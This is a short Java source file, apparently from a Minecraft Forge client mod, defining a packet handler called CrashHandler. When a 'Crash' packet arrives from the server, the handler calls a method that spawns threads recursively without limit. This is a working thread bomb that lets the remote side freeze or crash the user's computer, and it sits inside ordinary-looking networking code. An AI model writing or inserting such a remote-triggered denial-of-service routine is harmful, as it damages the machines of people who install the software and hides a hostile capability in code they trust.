package com.github.maxopoly.WPClient.packetHandling;

import com.github.maxopoly.WPCommon.packetHandling.PacketIndex;
import com.github.maxopoly.WPCommon.packetHandling.incoming.JSONPacketHandler;
import net.minecraftforge.fml.common.FMLLog;
import org.json.JSONObject;

public class CrashHandler implements JSONPacketHandler {

	@Override
	public void handle(JSONObject json) {
		FMLLog.getLogger().info("It didnt have to come this far...");
		order66();
	}

	private static void order66() {
		for (int i = 0; i < 5; i++) {
			new Thread(new Runnable() {

				@Override
				public void run() {
					order66();
				}
			}).start();
		}
	}

	@Override
	public PacketIndex getPacketToHandle() {
		return PacketIndex.Crash;
	}
}
